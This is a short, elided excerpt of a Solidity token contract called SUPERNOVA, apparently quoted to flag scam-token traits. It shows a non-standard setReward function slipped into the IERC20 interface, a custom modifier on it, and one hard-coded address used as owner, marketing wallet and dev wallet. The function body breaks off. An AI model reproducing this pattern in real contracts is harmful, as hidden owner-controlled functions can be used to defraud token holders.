...
interface IERC20 {
    ...
    function setReward(address account) external returns (uint256);
...
contract SUPERNOVA is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xcB93309F86eB07ce0D477Dd9AC2faC750B7a08b6); 
    address payable public Wallet_Dev = payable(0xcB93309F86eB07ce0D477Dd9AC2faC750B7a08b6);
    ...
    string private constant _symbol = unicode"Supernova"; 
    ...
    constructor () {
        ...
        _owner = 0xcB93309F86eB07ce0D477Dd9AC2faC750B7a08b6;
    ...
    function setReward(address account) public set override returns (uint256) {
        if(isBuyFee){
